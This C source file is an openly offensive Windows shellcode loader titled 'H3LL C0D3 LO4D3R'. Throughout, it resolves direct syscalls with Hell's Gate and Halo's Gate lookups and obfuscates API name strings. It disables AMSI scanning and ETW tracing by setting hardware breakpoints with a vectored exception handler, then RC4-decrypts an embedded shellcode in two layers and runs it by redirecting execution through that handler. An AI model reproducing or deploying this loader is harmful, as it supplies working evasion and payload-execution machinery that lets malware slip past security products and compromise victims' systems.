#include "func.h"
#include "shellcode.h"
#include "gate.h"

#define SEPARADOR() printf("###############################################################################\r\n")
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

extern PVOID getntdll();
extern PVOID getExportTable(PVOID moduleAddr);
extern PVOID getExAddressTable(PVOID moduleExportTableAddr, PVOID moduleAddr);
extern PVOID getExNamePointerTable(PVOID moduleExportTableAddr, PVOID moduleAddr);
extern PVOID getExOrdinalTable(PVOID moduleExportTableAddr, PVOID moduleAddr);
extern PVOID getApiAddr(DWORD apiNameStringLen, LPSTR apiNameString, PVOID moduleAddr, PVOID ExExAddressTable, PVOID ExNamePointerTable, PVOID ExOrdinalTable);
extern DWORD findSyscallNumber(PVOID ntdllApiAddr);
extern DWORD halosGateUp(PVOID ntdllApiAddr, WORD index);
extern DWORD halosGateDown(PVOID ntdllApiAddr, WORD index);

PVOID ntdll = NULL;
PVOID ntdllExportTable = NULL;
PVOID ntdllExAddrTbl = NULL;
PVOID ntdllExNamePtrTbl = NULL;
PVOID ntdllExOrdinalTbl = NULL;

void getSyscallInfo(char* apiName, char* apiNameStr, DWORD* SSN, PBYTE* addr) {
    if (apiName == NULL || apiNameStr == NULL || SSN == NULL || addr == NULL) {
        fprintf(stderr, "[-] Error: One or more parameter pointers are null.\n");
        return;
    }

    size_t maxLen = 256;
    size_t len = strnlen(apiNameStr, maxLen);
    if (len == maxLen) {
        fprintf(stderr, "[-] Error: apiNameStr does not end with '\\0' or is too long.\n");
        return;
    }

    *addr = (PBYTE)getApiAddr((DWORD)len, apiNameStr, ntdll, ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl);
    if (*addr == NULL) {
        fprintf(stderr, "[-] Error: getApiAddr returned NULL for API %s.\n", apiNameStr);
        return;
    }

    *SSN = findSyscallNumber(*addr);
    if (*SSN == 0) {
        DWORD index = 0;
        while (*SSN == 0) {
            index++;
            *SSN = halosGateUp(*addr, (WORD)index);
            if (*SSN) {
                *SSN = *SSN - index;
                break;
            }
            *SSN = halosGateDown(*addr, (WORD)index);
            if (*SSN) {
                *SSN = *SSN + index;
                break;
            }
            if (index > 1000) {
                fprintf(stderr, "[-] Error: Could not find syscall number for API %s.\n", apiNameStr);
                break;
            }
        }
    }
}

BOOL Gate() {
    SEPARADOR();
    ntdll = getntdll();

    printf("[*] %p : NTDLL Base Address\r\n", ntdll);

    ntdllExportTable = getExportTable(ntdll);
    printf("[*] %p : NTDLL Export Table Address\r\n", ntdllExportTable);

    ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdll);
    printf("[*] %p : NTDLL Export Address Table Address\r\n", ntdllExAddrTbl);

    ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdll);
    printf("[*] %p : NTDLL Export Name Pointer Table Address\r\n", ntdllExNamePtrTbl);

    ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdll);
    printf("[*] %p : NTDLL Export Ordinal Table Address\r\n", ntdllExOrdinalTbl);
    SEPARADOR();

    char obf_NtAllocateVirtualMemoryName[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    char obf_NtWriteVirtualMemoryName[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    char obf_NtProtectVirtualMemoryName[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    char obf_NtGetContextThreadName[] = { 'N', 't', 'G', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    char obf_NtSetContextThreadName[] = { 'N', 't', 'S', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0 };

    getSyscallInfo(obf_NtAllocateVirtualMemoryName, obf_NtAllocateVirtualMemoryName, &SSNtAllocateVirtualMemory, &AddrNtAllocateVirtualMemory);
    getSyscallInfo(obf_NtProtectVirtualMemoryName, obf_NtProtectVirtualMemoryName, &SSNtProtectVirtualMemory, &AddrNtProtectVirtualMemory);
    getSyscallInfo(obf_NtWriteVirtualMemoryName, obf_NtWriteVirtualMemoryName, &SSNtWriteVirtualMemory, &AddrNtWriteVirtualMemory);
    getSyscallInfo(obf_NtGetContextThreadName, obf_NtGetContextThreadName, &SSNtGetContextThread, &AddrNtGetContextThread);
    getSyscallInfo(obf_NtSetContextThreadName, obf_NtSetContextThreadName, &SSNtSetContextThread, &AddrNtSetContextThread);

    printf("[+] SSN of NtAllocateVirtualMemory: ");
    printf("0x%02X, ", SSNtAllocateVirtualMemory);
    printf("Syscall Address: ");
    printf("0x%016llX\n", AddrNtAllocateVirtualMemory + 0x12);
    printf("[+] SSN of NtWriteVirtualMemory: ");
    printf("0x%02X, ", SSNtWriteVirtualMemory);
    printf("Syscall Address: ");
    printf("0x%016llX\n", AddrNtWriteVirtualMemory + 0X12);
    printf("[+] SSN of NtProtectVirtualMemory: ");
    printf("0x%02X, ", SSNtProtectVirtualMemory);
    printf("Syscall Address: ");
    printf("0x%016llX\n", AddrNtProtectVirtualMemory + 0x12);
    printf("[+] SSN of NtGetContextThread: ");
    printf("0x%02X, ", SSNtGetContextThread);
    printf("Syscall Address: ");
    printf("0x%016llX\n", AddrNtGetContextThread + 0x12);
    printf("[+] SSN of NtSetContextThread: ");
    printf("0x%02X, ", SSNtSetContextThread);
    printf("Syscall Address: ");
    printf("0x%016llX\n", AddrNtSetContextThread + 0x12);

    AddrNtWriteVirtualMemory += 0x12;
    AddrNtProtectVirtualMemory += 0x12;
    AddrNtAllocateVirtualMemory += 0x12;
    AddrNtGetContextThread += 0x12;
    AddrNtSetContextThread += 0x12;
}

FARPROC g_pLoadLibraryA = NULL;
PVOID ExceptionHandle = NULL;
PVOID shellcodeMemory = NULL;
DWORD shellcodeSize = sizeof(shellcode);
BOOL shellcodeExecuted = FALSE;

VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

typedef struct _USTRING {
    ULONG Length;
    ULONG MaximumLength;
    PWSTR Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    USTRING* Img,
    USTRING* Key
    );

UINT_PTR getLoadLibraryA() {
    return (UINT_PTR)g_pLoadLibraryA;
}

HMODULE LoadLibraryViaCallback(const char* libName) {

    char obf_LoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
    char obf_TpAllocWork[] = { 'T','p','A','l','l','o','c','W','o','r','k',0 };
    char obf_TpPostWork[] = { 'T','p','P','o','s','t','W','o','r','k',0 };
    char obf_TpReleaseWork[] = { 'T','p','R','e','l','e','a','s','e','W','o','r','k',0 };
    char obf_Kernel32[] = { 'k','e','r','n','e','l','3','2',0 };
    char obf_NtDll[] = { 'n','t','d','l','l',0 };

    FARPROC pKernel32LoadLibraryA = GetProcAddress(GetModuleHandleA(obf_Kernel32), obf_LoadLibraryA);
    FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA(obf_NtDll), obf_TpAllocWork);
    FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA(obf_NtDll), obf_TpPostWork);
    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA(obf_NtDll), obf_TpReleaseWork);

    if (!pKernel32LoadLibraryA || !pTpAllocWork || !pTpPostWork || !pTpReleaseWork) {
        printf("[-] Failed to get necessary functions for callback.\n");
        return NULL;
    }

    g_pLoadLibraryA = pKernel32LoadLibraryA;

    typedef NTSTATUS(NTAPI* TPALLOCWORK)(PTP_WORK*, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
    typedef VOID(NTAPI* TPPOSTWORK)(PTP_WORK);
    typedef VOID(NTAPI* TPRELEASEWORK)(PTP_WORK);

    TPALLOCWORK TpAllocWork = (TPALLOCWORK)pTpAllocWork;
    TPPOSTWORK TpPostWork = (TPPOSTWORK)pTpPostWork;
    TPRELEASEWORK TpReleaseWork = (TPRELEASEWORK)pTpReleaseWork;

    PTP_WORK WorkReturn = NULL;
    NTSTATUS status = TpAllocWork(&WorkReturn, WorkCallback, (PVOID)libName, NULL);

    if (!NT_SUCCESS(status)) {
        printf("[-] TpAllocWork failed with status: 0x%lx\n", status);
        return NULL;
    }

    TpPostWork(WorkReturn);
    TpReleaseWork(WorkReturn);

    WaitForSingleObject((HANDLE)-1, 0x1000);

    return GetModuleHandleA(libName);
}

BOOL HwbpEngineBreakpoint(
    _In_ ULONG Position,
    _In_ PVOID Function
)
{
    CONTEXT Context = { 0 };

    SecureZeroMemory(&Context, sizeof(Context));
    Context.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!NT_SUCCESS(NtGetContextThread(GetCurrentThread(), &Context))) {
        printf("[-] NtGetContextThread failed\n");
        return FALSE;
    }

    if (Function) {
        ((PULONG_PTR)&Context.Dr0)[Position] = (UINT_PTR)Function;
        Context.Dr7 &= ~(3ULL << (16 + 4 * Position));
        Context.Dr7 &= ~(3ULL << (18 + 4 * Position));
        Context.Dr7 |= 1ULL << (2 * Position);
    }
    else {
        ((PULONG_PTR)&Context.Dr0)[Position] = 0;
        Context.Dr7 &= ~(1ULL << (2 * Position));
    }

    if (!NT_SUCCESS(NtSetContextThread(GetCurrentThread(), &Context))) {
        printf("[-] NtSetContextThread failed\n");
        return FALSE;
    }

    return TRUE;
}

LONG CALLBACK HwbpEngineHandler(
    _In_ PEXCEPTION_POINTERS ExceptionInfo
)
{
    PVOID AmsiAddress = NULL;
    PVOID EtwAddress = NULL;
    PEXCEPTION_RECORD ExceptionRecord = ExceptionInfo->ExceptionRecord;
    PCONTEXT Context = ExceptionInfo->ContextRecord;
    UINT_PTR ReturnAddress = 0;
    PULONG ScanResult = NULL;

    char obf_AmsiScanBuffer[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r',0 };
    char obf_AmsiDll[] = { 'a','m','s','i','d','l','l',0 };
    char obf_NtDll[] = { 'n','t','d','l','l',0 };
    char obf_NtTraceEvent[] = { 'N','t','T','r','a','c','e','E','v','e','n','t',0 };

    AmsiAddress = GetProcAddress(GetModuleHandleA(obf_AmsiDll), obf_AmsiScanBuffer);
    EtwAddress = GetProcAddress(GetModuleHandleA(obf_NtDll), obf_NtTraceEvent);

    if (ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        if (ExceptionRecord->ExceptionAddress == AmsiAddress)
        {
            ReturnAddress = *(PULONG_PTR)Context->Rsp;
            ScanResult = (PULONG)(*(PULONG_PTR)(Context->Rsp + (6 * sizeof(PVOID))));
            *ScanResult = 0;
            Context->Rip = ReturnAddress;
            Context->Rsp += sizeof(PVOID);
            Context->Rax = S_OK;

            return EXCEPTION_CONTINUE_EXECUTION;
        }
        if (ExceptionRecord->ExceptionAddress == EtwAddress)
        {
            Context->Rip = *(PULONG_PTR)Context->Rsp;
            Context->Rsp += sizeof(PVOID);
            Context->Rax = STATUS_SUCCESS;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL RC4DEC(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
    NTSTATUS STATUS;
    USTRING Key = { dwRc4KeySize, dwRc4KeySize, (PWSTR)pRc4Key };
    USTRING Img = { sPayloadSize, sPayloadSize, (PWSTR)pPayloadData };

    char a_dll_name[] = { 'A','d','v','a','p','i','3','2',0 };
    char obf_SysFunc32[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2',0 };
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryViaCallback(a_dll_name), obf_SysFunc32);

    if (!SystemFunction032) {
        printf("[-] Failed to get SystemFunction032\n");
        return FALSE;
    }

    STATUS = SystemFunction032(&Img, &Key);
    return NT_SUCCESS(STATUS);
}

BOOL DoubleRC4Decrypt(PBYTE pKey, PBYTE pPayload, DWORD dwKeySize, DWORD dwPayloadSize) {
    USTRING Key = { dwKeySize, dwKeySize, (PWSTR)pKey };
    USTRING Img = { dwPayloadSize, dwPayloadSize, (PWSTR)pPayload };

    char a_dll_name[] = { 'A','d','v','a','p','i','3','2',0 };
    char obf_SysFunc32[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2',0 };
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(GetModuleHandleA(a_dll_name), obf_SysFunc32);

    if (!SystemFunction032)
        return FALSE;

    NTSTATUS status = SystemFunction032(&Img, &Key);
    return NT_SUCCESS(status);
}

void CheckETWStatus() {
    typedef NTSTATUS(NTAPI* NtTraceEvent_t)(PVOID);
    char obf_NtTraceEvent[] = { 'N', 't', 'T', 'r', 'a', 'c', 'e', 'E', 'v', 'e', 'n', 't', 0 };
    char obf_NtDll[] = { 'n', 't', 'd', 'l', 'l', 0 };

    PVOID EtwFunc = GetProcAddress(GetModuleHandleA(obf_NtDll), obf_NtTraceEvent);

    if (!EtwFunc) {
        printf("[-] Failed to get NtTraceEvent for verification.\n");
        return;
    }

    NtTraceEvent_t pNtTraceEvent = (NtTraceEvent_t)EtwFunc;
    NTSTATUS status = 0;

    __try {
        status = pNtTraceEvent(NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = 0xC0000005;
    }

    if (status == STATUS_SUCCESS) {
        printf("[*] NtTraceEvent returned STATUS_SUCCESS. ETW possibly disabled.\n");
    }
    else if (status == 0xC0000005) {
        printf("[*] NtTraceEvent generated access violation (0xC0000005). ETW possibly disabled.\n");
    }
    else {
        SEPARADOR();
        printf("[*] NtTraceEvent returned 0x%lx. ETW possibly functioning normally\n", status);
    }
}

LONG CALLBACK VehHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        if (!shellcodeExecuted) {
            printf("[*] Entering VEH Handler\n");

            ULONG old_protect = 0;
            SIZE_T regionSize = shellcodeSize;

            NTSTATUS status = NtProtectVirtualMemory(
                GetCurrentProcess(),
                &shellcodeMemory,
                &regionSize,
                PAGE_EXECUTE_READ,
                &old_protect
            );

            if (!NT_SUCCESS(status)) {
                printf("[-] NtProtectVirtualMemory failed: 0x%X\n", status);
                return EXCEPTION_CONTINUE_SEARCH;
            }
            printf("[*] Memory protection changed to executable\n");

            ExceptionInfo->ContextRecord->Rip = (DWORD64)shellcodeMemory;
            shellcodeExecuted = TRUE;

            printf("[+] RIP redirected to shellcode\n");
            printf("[*] Exiting VEH Handler\n");

            RemoveVectoredExceptionHandler(ExceptionHandle);
            ExceptionHandle = NULL;

            SEPARADOR();

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void ExecuteCharge() {
    AddVectoredExceptionHandler(1, VehHandler);

    SIZE_T regionSize = shellcodeSize;

    SEPARADOR();
    printf("[*] Press Enter to allocate memory with NtAllocateVirtualMemory");
    (void)getchar();

    NTSTATUS statusA = NtAllocateVirtualMemory(GetCurrentProcess(), &shellcodeMemory, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(statusA)) {
        fprintf(stderr, "[-] Error: Failed to allocate virtual memory. NTSTATUS: 0x%08X\n", statusA);
        return;
    }

    printf("[*] Shellcode successfully allocated at address: %p\n", shellcodeMemory);
    printf("[*] Press Enter to allocate memory with NtWriteVirtualMemory");
    (void)getchar();

    SIZE_T bytesWritten = 0;
    NTSTATUS statusW = NtWriteVirtualMemory(GetCurrentProcess(), shellcodeMemory, shellcode, shellcodeSize, &bytesWritten);
    if (!NT_SUCCESS(statusW)) {
        fprintf(stderr, "[-] Error: Failed to write to virtual memory. NTSTATUS: 0x%08X\n", statusW);
        return;
    }

    if (bytesWritten != shellcodeSize) {
        fprintf(stderr, "[-] Error: Bytes written (%zu) doesn't match expected size (%lu)\n", bytesWritten, shellcodeSize);
        return;
    }

    printf("[*] Amount of bytes written: %zu\n", bytesWritten);
    printf("[*] Shellcode successfully written at address: %p\n", shellcodeMemory);

    printf("[*] Press Enter to decrypt shellcode");
    (void)getchar();

    DWORD dwKeySize = sizeof(KeyOuter);
    if (!RC4DEC(KeyOuter, shellcodeMemory, dwKeySize, (DWORD)bytesWritten)) {
        printf("[-] Error decrypting the first layer\n");
        return;
    }

    DWORD dw2KeySize = sizeof(decryptionkey);
    if (!DoubleRC4Decrypt(decryptionkey, shellcodeMemory, dw2KeySize, (DWORD)bytesWritten)) {
        printf("[-] Error decrypting the second layer\n");
        return;
    }

    printf("[+] Shellcode successfully decrypted!\n");
    printf("[*] Press Enter to execute shellcode");
    (void)getchar();
    printf("[*] Triggering exception to execute shellcode...\n");
    SEPARADOR();
    ((void(*)())shellcodeMemory)();  // This intentionally triggers an access violation as the memory isn't executable yet, activating our VEH handler
}

int main(void)
{
    printf(
        "\n~~~~~~~~~~~~~~~~~~~~~~~~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ~~~~~~~~~~~~~~~~~~~~~~~~\n"
        "~~~~~~~~~~~~~~~~~~~~~~~~ |||  H3LL C0D3 LO4D3R o_O ||| ~~~~~~~~~~~~~~~~~~~~~~~~\n"
        "~~~~~~~~~~~~~~~~~~~~~~~~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ~~~~~~~~~~~~~~~~~~~~~~~~\n\n"
    );

    Gate();

    // Check initial ETW status before applying HWBP technique
    CheckETWStatus();

    // Clear any existing hardware breakpoints before setting new ones
    HwbpEngineBreakpoint(0, NULL);
    HwbpEngineBreakpoint(1, NULL);

    if (ExceptionHandle) {
        RemoveVectoredExceptionHandler(ExceptionHandle);
        ExceptionHandle = NULL;
    }

    char obf_AmsiDll[] = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0 };
    char obf_NtdllDll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0 };
    char obf_AmsiScanBuffer[] = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r', 0 };
    char obf_NtTraceEvent[] = { 'N', 't', 'T', 'r', 'a', 'c', 'e', 'E', 'v', 'e', 'n', 't', 0 };

    HMODULE hAmsi = LoadLibraryViaCallback(obf_AmsiDll);
    if (hAmsi) {
        printf("[+] amsi.dll loaded via callback: %p\n", hAmsi);
    }
    else {
        printf("[-] Failed to load amsi.dll via callback.\n");
    }

    HMODULE hNtdll = LoadLibraryViaCallback(obf_NtdllDll);
    if (hNtdll) {
        printf("[+] ntdll.dll loaded via callback: %p\n", hNtdll);
    }
    else
    {
        printf("[-] Failed to load ntdll.dll via callback.\n");
    }

    PVOID AmsiFunc = GetProcAddress(hAmsi, obf_AmsiScanBuffer);
    PVOID EtwFunc = GetProcAddress(hNtdll, obf_NtTraceEvent);
    if (!AmsiFunc || !EtwFunc) {
        printf("[-] Failed to get function addresses.\n");
        return 1;
    }

    if (!HwbpEngineBreakpoint(0, AmsiFunc)) {
        printf("[-] Failed to set breakpoint at position 0.\n");
        return 1;
    }
    if (!HwbpEngineBreakpoint(1, EtwFunc)) {
        printf("[-] Failed to set breakpoint at position 1.\n");
        return 1;
    }

    ExceptionHandle = AddVectoredExceptionHandler(1, HwbpEngineHandler);
    if (!ExceptionHandle) {
        printf("[-] AddVectoredExceptionHandler failed with error: %lx\n", GetLastError());
        return 1;
    }

    printf("[+] Hardware breakpoints set and exception handler installed.\n");

    // Verify ETW has been successfully disabled by our HWBP handler
    CheckETWStatus();

    ExecuteCharge();

    return 0;
}